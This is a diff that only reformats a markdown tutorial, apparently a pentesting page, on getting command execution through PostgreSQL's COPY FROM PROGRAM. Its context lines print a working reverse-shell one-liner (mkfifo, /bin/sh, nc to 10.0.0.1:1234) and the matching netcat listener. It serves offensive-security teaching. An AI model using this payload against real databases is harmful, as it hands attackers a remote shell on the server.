@@ -13,7 +13,7 @@ To execute system commands on Linux or Windows using PostgreSQL, you can leverag
 
 The process starts with the creation of a table designed to store the output of the commands you execute. This can be a temporary or permanent table based on your requirements. Here, we'll create a permanent table called `shell`.  
 
-
+<br>
 #### Step 1: Create a Table to Capture Output
 
 First, create a table where the output of the executed commands will be stored. This table will have a single column to hold text data.
@@ -21,7 +21,7 @@ First, create a table where the output of the executed commands will be stored. 
 ```sql
 CREATE TABLE shell(output text);
 ```
-
+<br>
 #### Step 2: Using the PROGRAM Parameter to Execute Commands  
 
 
@@ -31,14 +31,14 @@ With the table ready, you can now use the `PROGRAM` parameter within the `COPY` 
 ```sql
 COPY shell FROM PROGRAM 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f';
 ```
-
+<br>
 Here's a breakdown of the command sequence:
 
 * `rm /tmp/f;`: Removes any existing file named `/tmp/f`.
 * `mkfifo /tmp/f;`: Creates a named pipe `/tmp/f`. Named pipes allow for temporary file-like communication between processes.
 * `cat /tmp/f | /bin/sh -i 2>&1`: This part sets up a reverse shell. It reads from the named pipe, executes commands using the shell (`/bin/sh -i`), and redirects both stdout and stderr to the pipe.
 * `nc 10.0.0.1 1234 > /tmp/f`: This uses `netcat` (nc) to connect back to the attacker's machine listening on IP `10.0.0.1` and port `1234`. Output from the shell (connected via `nc`) is redirected back into `/tmp/f`, thus maintaining a continuous shell session.
-
+<br>
 #### Step 3: Set Up a Listener on the Attacking Machine  
 
 
@@ -48,8 +48,8 @@ Before running the `COPY` command, ensure that you've set up a listener on the a
 nc -lvp 1234
 ```
 
-
-#### Step4: Exploit:  
+<br>
+#### Step4: Exploit  
 
 
 ```sql
